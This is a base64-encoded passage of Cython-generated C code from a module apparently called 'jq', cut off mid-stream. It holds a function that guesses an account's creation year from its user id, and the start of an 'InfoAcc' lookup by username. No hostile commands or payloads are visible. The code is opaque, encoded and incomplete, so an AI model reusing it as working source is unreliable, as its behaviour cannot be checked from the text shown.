XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMSk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMTtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNzc1MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI3OTc2MDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIyNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMik7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMjtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yNzk3NjAwMDEsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjI2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkge1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF85MDA5OTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMjYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjI2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTMpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTM7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOTAwOTkwMDAxLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMjgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNCk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNDtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xOTAwMDAwMDAwLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNSk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNTtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yNTAwMDAwMDAwLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMzcxMzY2ODc4NiwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNik7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNjtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zNzEzNjY4Nzg2LCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNTY5OTc4NTIxNywgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMzQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNyk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxNztcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81Njk5Nzg1MjE3LCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfODUwNzk0MDYzNCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzUgPCAwKSkpIF9fUFlYX0VSUigwLCAyMzYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBpZiAoX19weXhfdF81KSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxOCk7XG4gICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxODtcbiAgICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF84NTA3OTQwNjM0LCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjEyNTQwMjk4MzQsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMzgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjM4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTkpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTk7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICAge1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yMDIwXzIwMjMpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yMDIwXzIwMjM7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcbiAgICAgIH1cblxuICAgICAgXG4gICAgfVxuICAgIF9fcHl4X0wzX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7XG4gICAgaWYgKF9fcHl4X3RfNikge1xuICAgICAgX19QeXhfRXJyUmVzdG9yZSgwLDAsMCk7XG5cbiAgICAgIFxuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGhoaCk7XG4gICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hoaGg7XG4gICAgICBnb3RvIF9fcHl4X0w2X2V4Y2VwdF9yZXR1cm47XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgIF9fcHl4X0w3X3RyeV9yZXR1cm46O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpO1xuICAgIGdvdG8gX19weXhfTDA7XG4gICAgX19weXhfTDZfZXhjZXB0X3JldHVybjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgZ290byBfX3B5eF9MMDtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5kYXRlIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl91aWQpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV85SW5mb0FjYyhQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yanFfOUluZm9BY2MgPSB7IkluZm9BY2MiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJqcV85SW5mb0FjYywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzlJbmZvQWNjKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUgPSAwO1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2dnID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJJbmZvQWNjICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VybmFtZSwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMjQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMjQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgIkluZm9BY2MiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMjsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiSW5mb0FjYyIsIDEsIDIsIDIsIGkpOyBfX1BZWF9FUlIoMCwgMjQ2LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDI0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgd